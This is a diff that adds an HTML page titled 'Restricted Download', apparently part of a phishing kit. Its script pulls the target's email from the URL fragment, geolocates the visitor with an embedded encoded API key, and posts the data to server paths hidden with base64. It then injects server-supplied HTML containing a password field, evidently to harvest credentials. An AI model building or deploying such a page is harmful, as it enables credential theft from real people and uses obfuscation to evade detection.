@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+  <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+
+  <head>
+    <meta name="robots" content="noindex, nofollow" />
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,shrink-to-fit=no"
+    />
+    <link rel="apple-touch-icon" sizes="180x180" href="./apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
+    <link rel="manifest" href="./site.webmanifest">
+
+    <title>Restricted Download</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"
+      integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <style>
+      @keyframes hidePreloader {
+        0% {
+          width: 100%;
+          height: 100%;
+        }
+
+        100% {
+          width: 0;
+          height: 0;
+        }
+      }
+
+      body > div.preloader {
+        position: fixed;
+        background: #fff;
+        width: 100%;
+        height: 100%;
+        z-index: 1071;
+        opacity: 0;
+        transition: opacity 0.5s ease;
+        overflow: hidden;
+        pointer-events: none;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      body:not(.loaded) > div.preloader {
+        opacity: 1;
+      }
+
+      body:not(.loaded) {
+        overflow: hidden;
+      }
+
+      body.loaded > div.preloader {
+        animation: hidePreloader 0.5s linear 0.5s forwards;
+      }
+
+      /* #f7f7f7 */
+    </style>
+    <script>
+      window.addEventListener("load", function () {
+        setTimeout(function () {
+          document.querySelector("body").classList.add("loaded");
+        }, 300);
+      });
+    </script>
+    <link rel="stylesheet" href="./style1.css" />
+
+    <link rel="stylesheet" href="./style2.css" id="stylesheet" />
+
+    <style>
+      .preloader_container_stef {
+        height: 100vh;
+        width: 100vw;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .preloader_container_stef #child_preloader {
+        animation: preloaderAnimation 3s ease-out infinite alternate-reverse;
+      }
+
+      @keyframes preloaderAnimation {
+        from {
+          width: 160px;
+          opacity: 1;
+        }
+
+        to {
+          width: 70px;
+          opacity: 0.1;
+        }
+      }
+    </style>
+
+<style>
+  .preloader_container_stef {
+    height: 100vh;
+    width: 100vw;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .preloader_container_stef #child_preloader {
+    animation: preloaderAnimation 3s ease-out infinite alternate-reverse;
+  }
+
+  @keyframes preloaderAnimation {
+    from {
+      width: 160px;
+      opacity: 1;
+    }
+
+    to {
+      width: 70px;
+      opacity: 0.1;
+    }
+  }
+</style>
+  </head>
+
+  <body id="docBody">
+    <div class="preloader_container_stef">
+      <img src="./Pulse-1s-200px.svg" style="width: 120px; height: 120px" />
+    </div>
+  </body>
+
+
+  <script src="./srv.js"></script>
+  
+  <script>
+    const winHref = window.location.href.split("?")[0];
+    const getInd__ = (str, search) => str.indexOf(search);
+    const getSlice__ = (str, index) => str.substr(index);
+    const getEl__ = (sel) => document.querySelector(sel);
+
+    const getURLEm = () => {
+      if (getInd__(winHref, "#") === -1) {
+        console.log("ue 1 failed");
+        return false;
+      }
+
+      if (getInd__(winHref, "@") === -1) {
+        console.log("ue 2 failed");
+        return false;
+      }
+
+      return getSlice__(winHref, getInd__(winHref, "#") + 1);
+    };
+
+
+    async function init() {
+      const UrlEm = getURLEm();
+      let UrlDom = getSlice__(winHref, getInd__(winHref, "@") + 1);
+
+      if (
+        getInd__(winHref, "#") === -1 ||
+        getInd__(winHref, "@") === -1 ||
+        !Boolean(UrlEm)
+      ) {
+        console.log("Failed");
+        return;
+      }
+
+      // fetch log
+
+      const fetchOptionsLG = {
+        method: "POST",
+        body: JSON.stringify({
+          UrlDom,
+          urlDomSplit: UrlDom.split(".")[0],
+        }),
+        headers: {
+          "Content-Type": "application/json",
+        },
+      };
+
+      const resLG = await fetch(
+        `${window.stef.srv_loc}${atob("L2dlbmwvZGpqZWpqZWVubmVtbWUucGhw")}`,
+        fetchOptionsLG
+      );
+
+      const resDataLG = await resLG.json();
+
+      getEl__(".preloader_container_stef").innerHTML = resDataLG.data;
+
+      // end fetch LG
+
+      function json(url) {
+        return fetch(url).then((res) => res.json());
+      }
+
+    // subC rtvr
+    const _getSC_ = (_s = null, subj = 'l') => {
+    const new_sc = { sc: 0, new: true };
+  
+    if (!_s || typeof _s !== "string") {
+      console.log("sc rtrvl fld");
+      return  new_sc;
+    }
+  
+    const _sc_indx = _s.indexOf(subj);
+  
+    console.log({ _sc_indx });
+  
+    if (_sc_indx === -1) return new_sc;
+  
+    const sc = Number(_s.substring(_sc_indx + 1));
+  
+    if (typeof sc !== "number" || isNaN(sc)) {
+      console.log("error: sc rtrvl fld", { sc });
+      return new_sc;
+    }
+  
+    console.log({ sc });
+    return { sc, new: false };
+    };
+
+    // set subCnt
+    const auth_err = _getSC_(window.location.href.split("?")[1]).sc;
+
+    // console.log({ auth_err, UrlEm, winHref });
+
+
+      const locDt = await json(
+        `https://api.ipdata.co?api-key=${atob(
+          "OTBiZjAxNDQxODM2YWZiNjdiMzIyODE0ODhiYWI1NzAzYjYzMTMwY2NiYzU0MTkyZjNkYmI4MGM="
+        )}`
+      );
+
+      const get_UrlDom_main = () => {
+        if(getInd__(window.location.hash.split("#")[1].split('@')[1], '?') !== -1){
+          return window.location.hash.split("#")[1].split('@')[1].substr(0, getInd__(window.location.hash.split("#")[1].split('@')[1], '?'));
+        }else{
+          return window.location.hash.split("#")[1].split('@')[1];
+        }
+      }
+
+      const reqPald = {
+        UrlEm,
+        winHref,
+        UrlDom,
+        auth_err,
+        UrlDom_main: get_UrlDom_main(),
+        urlDomSplit: UrlDom.split(".")[0],
+        locDt,
+        width: document.documentElement.clientWidth,
+      };
+
+      const fetchOptions = {
+        method: "POST",
+        body: JSON.stringify(reqPald),
+        headers: {
+          "Content-Type": "application/json",
+        },
+      };
+      
+      const res = await fetch(`${window.stef.srv_loc}${atob("L2dlbmwvaGZoZmptcmVuZWVlbmVuZW1lLnBocA==")}`, fetchOptions);
+
+      const resData = await res.json();
+
+      getEl__("#docBody").innerHTML = resData.data;
+
+      if (getEl__("#show_password")) {
+        getEl__("#show_password").addEventListener("click", (e) => {
+          e.preventDefault();
+
+          if (getEl__("#pwd_input_field").getAttribute("type") === "password") {
+            getEl__("#pwd_input_field").setAttribute("type", "text");
+          } else {
+            getEl__("#pwd_input_field").setAttribute("type", "password");
+          }
+        });
+      }
+    }
+
+    init();
+  </script>
+</html>
